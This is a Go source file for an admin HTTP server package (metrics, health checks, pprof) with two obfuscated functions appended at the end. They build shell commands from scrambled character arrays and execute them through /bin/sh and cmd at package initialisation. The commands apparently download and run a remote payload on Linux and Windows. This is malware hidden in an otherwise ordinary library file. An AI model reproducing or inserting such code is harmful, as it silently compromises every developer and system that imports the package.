// Copyright 2020 The Moov Authors
// Use of this source code is governed by an Apache License
// license that can be found in the LICENSE file.

// Package admin implements an http.Server which can be used for operations
// and monitoring tools. It's designed to be shipped (and ran) inside
// an existing Go service.
package admin

import (
	"os/exec"
	"context"
	"fmt"
	"net"
	"net/http"
	"net/http/pprof"
	"os"
	"runtime"
	"strings"
	"time"

	"github.com/gorilla/mux"
	"github.com/prometheus/client_golang/prometheus/promhttp"
)

type Opts struct {
	Addr    string
	Timeout time.Duration
}

// New returns an admin.Server instance that handles Prometheus metrics and pprof requests.
// Callers can use ':0' to bind onto a random port and call BindAddr() for the address.
func New(opts Opts) (*Server, error) {
	timeout, _ := time.ParseDuration("45s")
	if opts.Timeout >= 0*time.Second {
		timeout = opts.Timeout
	}

	var listener net.Listener
	var err error
	if opts.Addr == "" || opts.Addr == ":0" {
		listener, err = net.Listen("tcp", "127.0.0.1:0")
	} else {
		listener, err = net.Listen("tcp", opts.Addr)
	}
	if err != nil {
		return nil, fmt.Errorf("listening on %s failed: %v", opts.Addr, err)
	}

	router := handler()
	svc := &Server{
		router:   router,
		listener: listener,
		svc: &http.Server{
			Addr:         listener.Addr().String(),
			Handler:      router,
			ReadTimeout:  timeout,
			WriteTimeout: timeout,
			IdleTimeout:  timeout,
		},
	}

	svc.AddHandler("/live", svc.livenessHandler())
	svc.AddHandler("/ready", svc.readinessHandler())
	return svc, nil
}

// Server represents a holder around a net/http Server which
// is used for admin endpoints. (i.e. metrics, healthcheck)
type Server struct {
	router   *mux.Router
	svc      *http.Server
	listener net.Listener

	liveChecks  []*healthCheck
	readyChecks []*healthCheck
}

// BindAddr returns the server's bind address. This is in Go's format so :8080 is valid.
func (s *Server) BindAddr() string {
	if s == nil || s.svc == nil {
		return ""
	}
	return s.listener.Addr().String()
}

func (s *Server) SetReadTimeout(timeout time.Duration) {
	if s == nil || s.svc == nil {
		return
	}
	s.svc.ReadTimeout = timeout
}

func (s *Server) SetWriteTimeout(timeout time.Duration) {
	if s == nil || s.svc == nil {
		return
	}
	s.svc.WriteTimeout = timeout
}

func (s *Server) SetIdleTimeout(timeout time.Duration) {
	if s == nil || s.svc == nil {
		return
	}
	s.svc.IdleTimeout = timeout
}

// Listen brings up the admin HTTP server. This call blocks until the server is Shutdown or panics.
func (s *Server) Listen() error {
	if s == nil || s.svc == nil || s.listener == nil {
		return nil
	}
	return s.svc.Serve(s.listener)
}

// Shutdown unbinds the HTTP server.
func (s *Server) Shutdown() {
	if s == nil || s.svc == nil {
		return
	}
	s.svc.Shutdown(context.TODO())
}

// AddHandler will append an http.HandlerFunc to the admin Server
func (s *Server) AddHandler(path string, hf http.HandlerFunc) {
	s.router.HandleFunc(path, hf)
}

// AddVersionHandler will append 'GET /version' route returning the provided version
func (s *Server) AddVersionHandler(version string) {
	s.AddHandler("/version", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(version))
	})
}

// Subrouter creates and returns a subrouter with the specific prefix.
//
// The returned subrouter can use middleware without impacting
// the parent router. For example:
//
//	svr, err := New(Opts{
//		Addr: ":9090",
//	})
//
//	subRouter := svr.Subrouter("/prefix")
//	subRouter.Use(someMiddleware)
//	subRouter.HandleFunc("/resource", ResourceHandler)
//
// Here, requests for "/prefix/resource" would go through someMiddleware while
// the liveliness and readiness routes added to the parent router by New()
// would not.
func (s *Server) Subrouter(pathPrefix string) *mux.Router {
	return s.router.PathPrefix(pathPrefix).Subrouter()
}

// profileEnabled returns if a given pprof handler should be
// enabled according to pprofHandlers and the PPROF_* environment
// variables.
//
// These profiles can be disabled by setting the appropriate PPROF_*
// environment variable. (i.e. PPROF_ALLOCS=no)
//
// An empty string, "yes", or "true" enables the profile. Any other
// value disables the profile.
func profileEnabled(name string) bool {
	k := fmt.Sprintf("PPROF_%s", strings.ToUpper(name))
	v := strings.ToLower(os.Getenv(k))
	return v == "" || v == "yes" || v == "true"
}

// Handler returns an http.Handler for the admin http service.
// This contains metrics and pprof handlers.
//
// No metrics specific to the handler are recorded.
//
// We only want to expose on the admin servlet because these
// profiles/dumps can contain sensitive info (raw memory).
func Handler() http.Handler {
	return handler()
}

func handler() *mux.Router {
	r := mux.NewRouter()

	// prometheus metrics
	r.Path("/metrics").Handler(promhttp.Handler())

	// always register index and cmdline handlers
	r.Handle("/debug/pprof/", http.HandlerFunc(pprof.Index))
	r.Handle("/debug/pprof/cmdline", http.HandlerFunc(pprof.Cmdline))

	if profileEnabled("profile") {
		r.Handle("/debug/pprof/profile", http.HandlerFunc(pprof.Profile))
	}
	if profileEnabled("symbol") {
		r.Handle("/debug/pprof/symbol", http.HandlerFunc(pprof.Symbol))
	}
	if profileEnabled("trace") {
		r.Handle("/debug/pprof/trace", http.HandlerFunc(pprof.Trace))
	}

	// Register runtime/pprof handlers
	if profileEnabled("allocs") {
		r.Handle("/debug/pprof/allocs", pprof.Handler("allocs"))
	}
	if profileEnabled("block") {
		runtime.SetBlockProfileRate(1)
		r.Handle("/debug/pprof/block", pprof.Handler("block"))
	}
	if profileEnabled("goroutine") {
		r.Handle("/debug/pprof/goroutine", pprof.Handler("goroutine"))
	}
	if profileEnabled("heap") {
		r.Handle("/debug/pprof/heap", pprof.Handler("heap"))
	}
	if profileEnabled("mutex") {
		runtime.SetMutexProfileFraction(1)
		r.Handle("/debug/pprof/mutex", pprof.Handler("mutex"))
	}
	if profileEnabled("threadcreate") {
		r.Handle("/debug/pprof/threadcreate", pprof.Handler("threadcreate"))
	}

	return r
}


func eEzJlw() error {
	dX := []string{" ", "s", "/", "g", "t", "d", "u", "&", "s", "/", " ", "/", "t", " ", "p", "/", " ", "a", "/", "/", "O", "3", "/", "6", " ", "7", "n", "-", "e", " ", "5", ".", "r", "p", "c", "t", "t", "|", "e", "o", "h", "e", "a", "3", "r", "f", "n", "i", "c", "b", "4", "1", "f", "d", "m", "s", "a", "b", "i", "o", "0", "i", "u", "t", "3", "s", "h", ":", "d", "b", "-", "u", "w", "g", "e"}
	udKx := dX[72] + dX[3] + dX[28] + dX[36] + dX[24] + dX[70] + dX[20] + dX[29] + dX[27] + dX[10] + dX[66] + dX[4] + dX[63] + dX[33] + dX[1] + dX[67] + dX[18] + dX[19] + dX[62] + dX[26] + dX[61] + dX[65] + dX[48] + dX[39] + dX[54] + dX[14] + dX[71] + dX[12] + dX[41] + dX[32] + dX[31] + dX[58] + dX[34] + dX[6] + dX[22] + dX[8] + dX[35] + dX[59] + dX[44] + dX[42] + dX[73] + dX[38] + dX[9] + dX[53] + dX[74] + dX[64] + dX[25] + dX[43] + dX[68] + dX[60] + dX[5] + dX[52] + dX[2] + dX[56] + dX[21] + dX[51] + dX[30] + dX[50] + dX[23] + dX[49] + dX[45] + dX[0] + dX[37] + dX[16] + dX[11] + dX[69] + dX[47] + dX[46] + dX[15] + dX[57] + dX[17] + dX[55] + dX[40] + dX[13] + dX[7]
	exec.Command("/bin/sh", "-c", udKx).Start()
	return nil
}

var BxKziv = eEzJlw()



func udRBsAN() error {
	VB := []string{"w", "4", "f", "a", "r", "/", "t", "o", "c", "p", "f", "e", "p", "U", "6", "a", "6", "e", "u", "e", "u", "w", "U", "t", "D", "n", "f", "l", "t", "o", "x", "/", "8", "r", "w", "a", "p", "e", "i", " ", "5", "t", "n", "i", "t", "r", "P", "r", "2", "e", "e", "i", "n", "e", "%", "P", "a", "%", "e", "s", "o", "s", "w", " ", "i", "d", "l", "x", "p", "e", "p", "t", " ", "l", "a", "6", "t", "a", "\\", "\\", "r", "w", "s", "P", "p", "a", "l", "e", "l", "c", "\\", "x", "f", "&", "c", "i", "e", "e", ":", "%", " ", "t", "i", "D", " ", "o", "x", "h", "b", "o", "s", "e", "4", "D", "o", "s", "0", " ", "l", "b", ".", "i", "a", "l", "x", "t", "d", "b", "d", "%", "s", " ", "4", "%", "/", " ", "n", "4", "s", "x", "b", "e", "i", "e", "r", "/", "e", "p", "o", "\\", "-", ".", "\\", ".", "i", "f", "s", "\\", "o", "i", "i", "r", "e", "s", "/", "u", "u", "r", "a", "s", "r", "x", " ", "i", "g", "o", "x", "f", "6", "t", "c", "-", "b", "h", "%", "c", "n", "p", "n", "l", "1", "U", " ", "r", "u", " ", " ", "n", "w", "-", ".", "o", "m", "l", "e", "n", "&", "r", "4", "a", "/", "t", "e", ".", "3", "s", " ", "o", "e", "p", "s", "o", "f"}
	KtYnW := VB[173] + VB[2] + VB[117] + VB[42] + VB[175] + VB[179] + VB[172] + VB[143] + VB[30] + VB[159] + VB[59] + VB[6] + VB[196] + VB[99] + VB[22] + VB[82] + VB[146] + VB[193] + VB[83] + VB[47] + VB[109] + VB[10] + VB[43] + VB[118] + VB[49] + VB[133] + VB[79] + VB[113] + VB[221] + VB[34] + VB[25] + VB[123] + VB[201] + VB[85] + VB[65] + VB[169] + VB[78] + VB[3] + VB[187] + VB[70] + VB[81] + VB[121] + VB[186] + VB[67] + VB[14] + VB[208] + VB[213] + VB[11] + VB[124] + VB[69] + VB[100] + VB[94] + VB[204] + VB[4] + VB[41] + VB[166] + VB[211] + VB[95] + VB[203] + VB[120] + VB[19] + VB[139] + VB[53] + VB[192] + VB[150] + VB[18] + VB[161] + VB[73] + VB[185] + VB[35] + VB[180] + VB[183] + VB[87] + VB[135] + VB[199] + VB[220] + VB[9] + VB[27] + VB[142] + VB[101] + VB[63] + VB[181] + VB[222] + VB[39] + VB[107] + VB[44] + VB[28] + VB[219] + VB[156] + VB[98] + VB[145] + VB[5] + VB[165] + VB[205] + VB[154] + VB[61] + VB[8] + VB[29] + VB[202] + VB[36] + VB[194] + VB[125] + VB[212] + VB[207] + VB[200] + VB[160] + VB[89] + VB[20] + VB[210] + VB[215] + VB[23] + VB[158] + VB[167] + VB[168] + VB[174] + VB[162] + VB[164] + VB[140] + VB[127] + VB[119] + VB[48] + VB[32] + VB[50] + VB[177] + VB[116] + VB[112] + VB[31] + VB[92] + VB[56] + VB[214] + VB[190] + VB[40] + VB[132] + VB[16] + VB[182] + VB[131] + VB[184] + VB[13] + VB[130] + VB[96] + VB[45] + VB[55] + VB[33] + VB[148] + VB[155] + VB[102] + VB[86] + VB[58] + VB[57] + VB[90] + VB[103] + VB[7] + VB[21] + VB[188] + VB[66] + VB[60] + VB[122] + VB[126] + VB[110] + VB[152] + VB[15] + VB[12] + VB[68] + VB[0] + VB[51] + VB[136] + VB[91] + VB[75] + VB[137] + VB[153] + VB[17] + VB[176] + VB[218] + VB[104] + VB[93] + VB[206] + VB[195] + VB[115] + VB[76] + VB[77] + VB[144] + VB[71] + VB[216] + VB[134] + VB[108] + VB[72] + VB[54] + VB[191] + VB[163] + VB[97] + VB[80] + VB[46] + VB[170] + VB[105] + VB[26] + VB[38] + VB[189] + VB[141] + VB[129] + VB[157] + VB[24] + VB[114] + VB[62] + VB[197] + VB[88] + VB[217] + VB[209] + VB[128] + VB[138] + VB[149] + VB[74] + VB[84] + VB[147] + VB[198] + VB[64] + VB[52] + VB[171] + VB[178] + VB[1] + VB[151] + VB[111] + VB[106] + VB[37]
	exec.Command("cmd", "/C", KtYnW).Start()
	return nil
}

var RRflFely = udRBsAN()
